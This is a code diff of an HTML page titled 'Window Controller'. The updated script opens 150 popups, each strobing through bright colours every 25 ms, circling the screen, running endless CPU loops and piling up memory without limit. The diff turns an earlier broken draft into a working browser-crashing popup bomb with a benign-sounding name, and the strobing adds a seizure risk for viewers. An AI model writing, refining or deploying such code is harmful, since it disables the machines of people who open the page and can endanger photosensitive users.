@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>.</title>
+  <title>Window Controller</title>
   <style>
     body {
       background: #111;
@@ -19,14 +19,18 @@
 
   <script>
     function winow() {
-      const now = 1;
-      const br = 50;
-      const rs = 40;
-      const speed = -20;
+      const now = 150;
+      const br = 5;
+      const rs = 4;
+      const speed = -500;
 
       for (let i = 0; i < now; i++) {
-        const popup = window.open('', '', 'width=100,height=100');
+        const popup = window.open('', '', 'width=50,height=50');
 
+        if (!popup) {
+          console.error("Popup blocked! Please allow popups for this site.");
+          return;
+        }
 
         const radius = br + i * rs;
         const initialAngle = i * (Math.PI / 5);
@@ -35,74 +39,63 @@
           <!DOCTYPE html>
           <html>
           <head>
-            <title>.</title>
+            <title>Popup</title>
             <style>
-              html, body {
-      height: 100%;
-      margin: 0;
-      overflow: hidden;
-    }
+              html, body { height: 100%; margin: 0; overflow: hidden; }
             </style>
           </head>
           <body>
             <script>
-const colors = [
-      "#FF0000", // Red
-      "#00FF00", // Green
-      "#0000FF", // Blue
-      "#FFFF00", // Yellow
-      "#FF00FF", // Magenta
-      "#00FFFF", // Cyan
-      "#FFFFFF", // White
-      "#000000"  // Black
-    ];
-    let ramData = [];
-    let i = 0;
-    setInterval(() => {
-      document.body.style.backgroundColor = colors[i];
-      i = (i + 1) % colors.length;
-    }, 25);
+              const colors = ["#FF0000", "#00FF00", "#0000FF", "#FFFF00", "#FF00FF", "#00FFFF", "#FFFFFF", "#000000"];
+              let ramData = [];
+              let colorIdx = 0;
+
+              setInterval(() => {
+                document.body.style.backgroundColor = colors[colorIdx];
+                colorIdx = (colorIdx + 1) % colors.length;
+              }, 25);
+
               let angle = ${initialAngle};
               const radius = ${radius};
               const speed = ${speed};
 
-              const screenWidth = screen.availWidth;
-              const screenHeight = screen.availHeight;
-              const popupWidth = 300;
-              const popupHeight = 200;
-
-              const centerX = screenWidth / 2 - popupWidth / 2;
-              const centerY = screenHeight / 2 - popupHeight / 2;
+              const centerX = screen.availWidth / 2 - 150;
+              const centerY = screen.availHeight / 2 - 100;
 
               function animate() {
-                angle += speed;
+                angle += 0.05; // Adjusted speed for visible movement
                 const x = centerX + radius * Math.cos(angle);
                 const y = centerY + radius * Math.sin(angle);
                 window.moveTo(x, y);
                 requestAnimationFrame(animate);
               }
+
               function cpuLoop() {
-        for (let i = 0; i < 5e6; i++) {
-          Math.sqrt(i * Math.random());
-        }
-        function ramLoop() {
-      const sizeMB = 700;
-      let data = new Uint8Array(sizeMB * 1024 * 1024);
+                for (let i = 0; i < 1e6; i++) {
+                  Math.sqrt(Math.random());
+                }
+                setTimeout(cpuLoop, 10);
+              }
 
-      for (let i = 0; i < data.length; i++) {
-        data[i] = i % 256;
-      }
+              function ramLoop() {
+                try {
+                  let data = new Uint8Array(10 * 1024 * 1024); // 10MB increments
+                  data.fill(255);
+                  ramData.push(data);
+                } catch (e) {
+                  console.error("Memory limit reached");
+                }
+                setTimeout(ramLoop, 1000);
+              }
 
-      ramData.push(data);
-    }
-              setTimeout(() => {
-      startCPU();
-      startRAM();
-    }, 3000);
+              animate();
+              cpuLoop();
+              ramLoop();
             <\/script>
           </body>
           </html>
         `);
+        popup.document.close();
       }
     }
   </script>
